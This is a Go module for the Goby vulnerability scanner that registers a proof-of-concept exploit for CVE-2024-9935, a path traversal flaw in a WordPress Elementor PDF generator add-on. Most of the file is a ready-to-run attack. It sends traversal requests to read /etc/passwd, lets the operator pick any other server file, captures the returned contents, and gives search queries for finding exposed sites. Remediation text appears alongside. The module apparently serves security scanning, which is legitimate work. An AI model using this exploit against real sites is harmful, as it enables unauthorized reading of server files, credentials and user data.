package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Elementor Page Builder Plugin /elementor-84/ File Read Vulnerability (CVE-2024-9935)",
    "Description": "<p>The PDF generator plugin of WordPress Elementor Page Builder plugin has a path traversal vulnerability in all versions prior to 1.7.5. Attackers can exploit this vulnerability to read arbitrary file contents on the server by crafting malicious requests, which may include sensitive information such as system configuration files or user data.</p>",
    "Product": "WordPress Elementor Page Builder Plugin",
    "Homepage": "https://wordpress.org/plugins/elementor/",
    "DisclosureDate": "2024-12-04",
    "PostTime": "2024-12-06",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"wp-content/plugins/pdf-generator-addon-for-elementor-page-builder/\" && body=\"wp-content/themes/\"",
    "GobyQuery": "body=\"wp-content/plugins/pdf-generator-addon-for-elementor-page-builder/\" && body=\"wp-content/themes/\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files on the server through path traversal, potentially leading to sensitive information disclosure, including system configuration files and user data, which may further be exploited for deeper attacks.</p>",
    "Recommendation": "<p>1.It is recommended to immediately upgrade the WordPress Elementor Page Builder plugin to version 1.7.5 or higher </p><p>2.Restrict access to plugin-related interfaces to avoid exposure to the internet.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144250809?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "textarea",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{{{filePath_encode}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x:0:0:root:/root:/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-9935"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "WordPress Elementor Page Builder插件 /elementor-84/ 文件读取漏洞（CVE-2024-9935）",
            "Product": "WordPress Elementor Page Builder插件",
            "Description": "<p>WordPress 的 Elementor Page Builder 插件的 PDF 生成器插件在 1.7.5 之前的所有版本中存在路径遍历漏洞。攻击者可以利用该漏洞通过构造恶意请求读取服务器上的任意文件内容，其中可能包含敏感信息，如系统配置文件或用户数据。</p>",
            "Recommendation": "<p>1.建议立即升级WordPress Elementor Page Builder插件至1.7.5或更高版本:<a href=\"https://wordpress.org/plugins/elementor/\">https://wordpress.org/plugins/elementor/</a></p><p>2.限制对插件相关接口的访问权限，避免暴露在互联网上。<br></p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过路径遍历读取服务器上的任意文件，可能导致敏感信息泄露，包括系统配置文件、用户数据等，进一步可能被利用进行更深层次的攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "WordPress Elementor Page Builder Plugin /elementor-84/ File Read Vulnerability (CVE-2024-9935)",
            "Product": "WordPress Elementor Page Builder Plugin",
            "Description": "<p>The PDF generator plugin of WordPress Elementor Page Builder plugin has a path traversal vulnerability in all versions prior to 1.7.5. Attackers can exploit this vulnerability to read arbitrary file contents on the server by crafting malicious requests, which may include sensitive information such as system configuration files or user data.</p>",
            "Recommendation": "<p>1.It is recommended to immediately upgrade the WordPress Elementor Page Builder plugin to version 1.7.5 or higher&nbsp;</p><p>2.Restrict access to plugin-related interfaces to avoid exposure to the internet.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files on the server through path traversal, potentially leading to sensitive information disclosure, including system configuration files and user data, which may further be exploited for deeper attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "filePath_encode": "define|query_encode|{{{filePath}}}",
        "VUL_PATH": "||/elementor-84/"
    },
    "VariablesOrder": [
        "filePath",
        "filePath_encode",
        "VUL_PATH"
    ],
    "EditType": "fast",
    "PocId": "9977"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
